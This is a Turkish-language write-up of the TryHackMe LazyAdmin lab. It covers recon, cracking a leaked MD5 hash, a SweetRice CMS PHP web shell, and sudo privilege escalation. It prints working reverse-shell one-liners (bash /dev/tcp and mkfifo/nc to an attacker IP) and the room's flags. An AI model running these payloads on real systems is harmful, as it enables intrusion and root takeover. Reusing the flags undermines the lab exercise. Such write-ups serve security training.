 # LazyAdmin — TryHackMe Writeup

![Zorluk](https://img.shields.io/badge/Zorluk-Kolay%2FOrta-brightgreen)
![Kategori](https://img.shields.io/badge/Kategori-Linux%20|%20CMS%20|%20Sudo%20İstismarı-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-green)

> **Yazar:** Miraç Akkuş (LatenT)  
> **Tarih:** Mayıs 2026  
> **Oda:** [LazyAdmin](https://tryhackme.com/room/lazyadmin)

---

## 📋 Yönetici Özeti

Bu write-up, **LazyAdmin** makinesinin sömürülmesini belgelemektedir. Hatalı yapılandırılmış bir SweetRice CMS yedekleme sızıntısı üzerinden kimlik bilgisi kurtarma, CMS reklam modülü üzerinden kimlik doğrulamalı uzaktan kod yürütme ve sudo yetkili bir Perl scripti tarafından çağrılan yazılabilir bir script üzerinden yetki yükseltme zincirini göstermektedir.

---

## 🛠️ Kullanılan Araçlar ve Teknolojiler

| Araç | Amaç |
|------|------|
| `nmap` | Ağ keşfi |
| `gobuster` | Dizin enumerasyonu |
| `john` | Parola hash kırma |
| `nc` | Ters kabuk dinleyicisi |

---

## 🔍 Aşama 1: Keşif ve Enumerasyon

### Ağ Taraması

```bash
nmap -sV -sC -T4 <HEDEF_IP>
```

### Bulgular

| Port | Durum | Servis | Versiyon |
|------|-------|--------|----------|
| 22/tcp | açık | SSH | OpenSSH |
| 80/tcp | açık | HTTP | Apache |

### Dizin Enumerasyonu

```bash
gobuster dir -u http://<HEDEF_IP> -w /usr/share/wordlists/dirb/common.txt
```

**Keşfedilen Dizinler:**

| Dizin | İçerik | Önem |
|-------|--------|------|
| `/content` | SweetRice CMS | Birincil web uygulaması |
| `/content/inc` | Yapılandırma dosyaları | Yedeklemeleri içerir |
| `/content/backup` | MySQL yedekleme | Kimlik bilgisi sızıntısı |

---

## 🌐 Aşama 2: Kimlik Bilgisi Kurtarma

### MySQL Yedekleme Keşfi

```bash
wget http://<HEDEF_IP>/content/inc/mysql_backup/mysql_bakup_20191129023059.sql
```

### Yedekleme Analizi

Çıkarılan kimlik bilgileri:
- **Kullanıcı Adı:** `manager`
- **Parola Hash'i:** `42f749ade7f9e195bf475f37a44cafcb`

### Hash Kırma

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Sonuç:** `Password123`

---

## 🎯 Aşama 3: SweetRice CMS Sömürüsü

### Admin Panel Erişimi

```bash
http://<HEDEF_IP>/content/as/
```

**Giriş:** `manager / Password123`

### Kimlik Doğrulamalı RCE (Reklam Modülü)

SweetRice 1.5.1, Reklam yönetim arayüzü üzerinden PHP kod yürütülmesine olanak tanır.

**Payload Enjeksiyonu:**
```php
<?php system($_GET['cmd']); ?>
```

**Yürütme URL'si:**
```bash
http://<HEDEF_IP>/content/inc/ads/hacked.php?cmd=whoami
```

### Ters Kabuk

**Dinleyici:**
```bash
nc -lvnp 4444
```

**Payload:**
```bash
http://<HEDEF_IP>/content/inc/ads/hacked.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/<SALDIRGAN_IP>/4444%200%3E%261%27
```

**Sonuç:** `www-data` olarak kabuk elde edildi

---

## 🏴 Aşama 4: Kullanıcı Flag'i

```bash
cat /home/itguy/user.txt
```

**Kullanıcı Flag'i:** `THM{63e5bce9271952aad1113b6f1ac28a07}`

---

## 🚀 Aşama 5: Yetki Yükseltme

### Sudo Yetki Analizi

```bash
sudo -l
```

**Bulgu:**
```
User www-data may run the following commands on lazyadmin:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

### Script Analizi

```bash
cat /home/itguy/backup.pl
```

**İçerik:**
```perl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

**Zafiyet:** `backup.pl`, `www-data` tarafından yazılabilir olan `/etc/copy.sh`'yi çalıştırır.

### Sömürü Zinciri

**Adım 1:** `/etc/copy.sh`'yi ters kabuk ile üzerine yaz:

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <SALDIRGAN_IP> 5554 > /tmp/f' > /etc/copy.sh
```

**Adım 2:** Dinleyici başlat:

```bash
nc -lvnp 5554
```

**Adım 3:** Sudo komutunu yürüt:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

**Sonuç:** Root kabuğu elde edildi.

---

## 🏁 Aşama 6: Root Flag'i

```bash
cat /root/root.txt
```

**Root Flag'i:** `THM{6637f41d0177b6f37cb20d775124699f}`

---

## 🗺️ Saldırı Yolu Görselleştirmesi

```
[Saldırgan]
    │
    ├───nmap───► [Hedef: 22, 80]
    │                │
    │                ▼
    │        [gobuster: /content, /content/inc, /content/backup]
    │                │
    │                ▼
    │        [MySQL yedekleme indirme]
    │                │
    │                ▼
    │        [Hash çıkarımı: manager:42f749...]
    │                │
    │                ▼
    │        [john: Password123]
    │                │
    │                ▼
    │        [SweetRice admin paneli]
    │                │
    │                ▼
    │        [Reklam modülü PHP RCE]
    │                │
    │                ▼
    │        [www-data kabuğu]
    │                │
    │                ▼
    │        [Kullanıcı Flag'i]
    │                │
    │                ▼
    │        [sudo -l: perl backup.pl]
    │                │
    │                ▼
    │        [backup.pl → /etc/copy.sh]
    │                │
    │                ▼
    │        [copy.sh'yi ters kabuk ile üzerine yaz]
    │                │
    │                ▼
    │        [sudo perl backup.pl]
    │                │
    │                ▼
    └────────► [Root kabuğu + Flag]
```

---

## 🛡️ Zafiyet Değerlendirmesi ve Çözümler

| # | Zafiyet | Şiddet | CVSS | Çözüm |
|---|---------|--------|------|-------|
| 1 | **MySQL Yedekleme Maruziyeti** | 🔴 Kritik | 9.0 | Yedekleme dosyalarını web kökünden kaldır; dizin listelemeyi kısıtla; erişim kontrolleri uygula |
| 2 | **Zayıf MD5 Parola Hash'i** | 🔴 Kritik | 9.8 | bcrypt/Argon2 kullan; güçlü parola politikaları zorla; MFA uygula |
| 3 | **SweetRice Reklam RCE** | 🔴 Kritik | 9.8 | CMS'i güncelle; reklam içeriğini sanitize et; kullanıcı girdisinde PHP yürütmesini devre dışı bırak |
| 4 | **Sudo Zincirinde Yazılabilir Script** | 🔴 Kritik | 9.0 | `/etc/copy.sh` izinlerini kısıtla; script bütünlüğünü doğrula; kontrol toplamları ile mutlak yollar kullan |
| 5 | **Kısıtsız Sudo Perl** | 🟠 Yüksek | 7.8 | Sudo'yu spesifik scriptlerle sınırla; NOPASSWD'yi kaldır; komut günlüğü uygula |

---

## 🎓 Temel Çıkarımlar

1. **Yedekleme Dosyaları:** Her zaman `/backup`, `/inc`, `/config` dizinlerini kontrol et — kimlik bilgileri sıklıkla sızdırılır
2. **MD5 Bozulmuştur:** Gökkuşağı tabloları MD5'i saniyeler içinde kırar — parola depolama için asla kullanma
3. **CMS Reklam Modülleri:** Sıklıkla keyfi kod yürütülmesine olanak tanır — kritik saldırı yüzeyi olarak değerlendir
4. **Sudo Zincir Analizi:** `sudo -l` tam yürütme zincirini ortaya çıkarır — çağrılan her scripti izle
5. **Yazılabilir Ara Scriptler:** Sudo hedefini değiştiremesen bile, ne çağırdığını kontrol et

---
---

## 🚩 Flag'ler

| Flag | Konum | Değer |
|------|-------|-------|
| **Kullanıcı Flag'i** | `/home/itguy/user.txt` | `THM{63e5bce9271952aad1113b6f1ac28a07}` |
| **Root Flag'i** | `/root/root.txt` | `THM{6637f41d0177b6f37cb20d775124699f}` |

---

> **⚠️ Yasal Uyarı:** Bu write-up sadece eğitim ve araştırma amaçlıdır. Sahibi olmadığınız sistemleri test etmeden önce her zaman açık yazılı yetki alın.

---

**Yazar:** Miraç Akkuş (LatenT)  
**Tarih:** Mayıs 2026
